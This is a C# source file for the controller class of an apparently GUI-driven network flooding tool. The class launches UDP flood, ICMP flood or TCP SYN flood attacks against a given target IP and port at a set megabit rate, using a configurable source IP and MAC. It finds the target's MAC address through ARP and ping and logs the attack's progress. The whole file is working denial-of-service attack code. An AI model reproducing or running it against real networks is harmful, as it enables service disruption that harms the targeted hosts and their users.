using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Controls;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using PacketProtocolType = PacketDotNet.ProtocolType;
using SocketsProtocolType = System.Net.Sockets.ProtocolType;
using System.Runtime.InteropServices;

namespace Dorothy.Models
{
    public class NetworkStorm : IDisposable
    {
        private string _sourceIp = string.Empty;
        private byte[] _sourceMac = Array.Empty<byte>();
        private bool _isAttackRunning = false;
        private readonly TextBox _logArea;
        private CancellationTokenSource? _cancellationSource;

        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();

        public bool IsAttackRunning => _isAttackRunning;
        public string SourceIp => _sourceIp;
        public byte[] SourceMac => _sourceMac;

        public NetworkStorm(TextBox logArea)
        {
            _logArea = logArea ?? throw new ArgumentNullException(nameof(logArea));
        }

        public void SetSourceIp(string sourceIp)
        {
            if (string.IsNullOrWhiteSpace(sourceIp))
                throw new ArgumentException("Source IP cannot be null or empty.", nameof(sourceIp));

            _sourceIp = sourceIp;
            Logger.Info($"Source IP set to {_sourceIp}");
        }

        public void SetSourceMac(byte[] sourceMac)
        {
            if (sourceMac == null || sourceMac.Length != 6)
                throw new ArgumentException("Source MAC must be a 6-byte array.", nameof(sourceMac));

            _sourceMac = sourceMac;
            Logger.Info($"Source MAC set to {BitConverter.ToString(_sourceMac).Replace("-", ":")}");
        }

        public async Task StartAttackAsync(AttackType attackType, string targetIp, int targetPort, long megabitsPerSecond)
        {
            if (_isAttackRunning)
            {
                Log("Attack already in progress.");
                return;
            }

            if (string.IsNullOrWhiteSpace(_sourceIp) || _sourceMac.Length != 6)
            {
                Log("Source IP or MAC is not set. Cannot start attack.");
                throw new Exception("Source IP or MAC is not set.");
            }

            _cancellationSource = new CancellationTokenSource();
            _isAttackRunning = true;

            Log("Starting attack...");
            try
            {
                string targetMacString = await GetMacAddressAsync(targetIp, _sourceIp);
                byte[] targetMac = ParseMacAddress(targetMacString);

                switch (attackType)
                {
                    case AttackType.UdpFlood:
                        using (var udpFlood = new UdpFlood(
                            _sourceIp,
                            _sourceMac,
                            targetIp,
                            targetMac,
                            targetPort,
                            megabitsPerSecond * 125_000, // Convert Mbps to bytes per second
                            _cancellationSource.Token))
                        {
                            await udpFlood.StartAsync();
                        }
                        break;
                    case AttackType.IcmpFlood:
                        using (var icmpFlood = new IcmpFlood(
                            _sourceIp,
                            _sourceMac,
                            targetIp,
                            targetMac,
                            megabitsPerSecond * 125_000,
                            _cancellationSource.Token))
                        {
                            await icmpFlood.StartAsync();
                        }
                        break;
                    case AttackType.TcpSynFlood:
                        using (var tcpFlood = new TcpFlood(
                            _sourceIp,
                            _sourceMac,
                            targetIp,
                            targetMac,
                            targetPort,
                            megabitsPerSecond * 125_000,
                            _cancellationSource.Token))
                        {
                            await tcpFlood.StartAsync();
                        }
                        break;
                }

                Log("Attack finished successfully.");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Attack failed.");
                Log($"Attack failed: {ex.Message}");
            }
            finally
            {
                _isAttackRunning = false;
                _cancellationSource.Dispose();
            }
        }

        public async Task StopAttackAsync()
        {
            if (!_isAttackRunning)
            {
                Log("No attack is running.");
                return;
            }

            _cancellationSource?.Cancel();
            Log("Stopping attack...");

            // Allow some time for the attack to stop gracefully
            await Task.Delay(500);

            _cancellationSource?.Dispose();
            _isAttackRunning = false;
            Log("Attack has been stopped.");
        }

        private async Task<string> GetMacAddressAsync(string targetIp, string sourceIp)
        {
            try
            {
                // Ensure the target is reachable by pinging
                bool pingable = await PingHostAsync(targetIp);
                if (!pingable)
                {
                    throw new Exception($"Target IP {targetIp} is not reachable.");
                }

                // Get source IP bytes
                var srcBytes = sourceIp.Split('.')
                    .Select(byte.Parse)
                    .ToArray();

                // Get destination IP bytes
                var dstBytes = targetIp.Split('.')
                    .Select(byte.Parse)
                    .ToArray();

                // Check if we need to reverse byte order based on architecture
                if (!BitConverter.IsLittleEndian)
                {
                    Array.Reverse(srcBytes);
                    Array.Reverse(dstBytes);
                }

                int srcIpInt = BitConverter.ToInt32(srcBytes, 0);
                int dstIpInt = BitConverter.ToInt32(dstBytes, 0);

                byte[] macAddr = new byte[6];
                int macAddrLen = macAddr.Length;

                int result = SendARP(dstIpInt, srcIpInt, macAddr, ref macAddrLen);
                if (result == 1168) // ERROR_NOT_FOUND
                {
                    Logger.Warn($"Target IP {targetIp} is not in the local ARP cache. Attempting to populate cache...");
                    
                    // Try to populate ARP cache by sending a ping
                    await PingHostAsync(targetIp);
                    
                    // Retry SendARP
                    result = SendARP(dstIpInt, srcIpInt, macAddr, ref macAddrLen);
                    if (result != 0)
                    {
                        throw new Exception($"SendARP failed with error code {result} after retry.");
                    }
                }
                else if (result != 0)
                {
                    throw new Exception($"SendARP failed with error code {result}.");
                }

                string macAddress = BitConverter.ToString(macAddr, 0, macAddrLen).Replace("-", ":");
                return macAddress;
            }
            catch (Exception ex)
            {
                Logger.Error(ex, $"Failed to get MAC address for IP {targetIp}.");
                throw;
            }
        }

        private byte[] ParseMacAddress(string macString)
        {
            try
            {
                return macString.Split(':').Select(hex => Convert.ToByte(hex, 16)).ToArray();
            }
            catch (Exception ex)
            {
                Logger.Error(ex, $"Failed to parse MAC address from string {macString}.");
                throw new Exception("Invalid MAC address format.");
            }
        }

        public async Task<bool> PingHostAsync(string host)
        {
            using (var ping = new Ping())
            {
                try
                {
                    PingReply reply = await ping.SendPingAsync(host, 1000);
                    return reply.Status == IPStatus.Success;
                }
                catch (PingException ex)
                {
                    Logger.Error(ex, $"Ping to {host} failed.");
                    return false;
                }
            }
        }

        public void Log(string message)
        {
            _logArea.Dispatcher.Invoke(() =>
            {
                _logArea.AppendText($"{DateTime.Now}: {message}\n");
                _logArea.ScrollToEnd();
            });
        }

        public void Dispose()
        {
            _cancellationSource?.Dispose();
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
    }
}
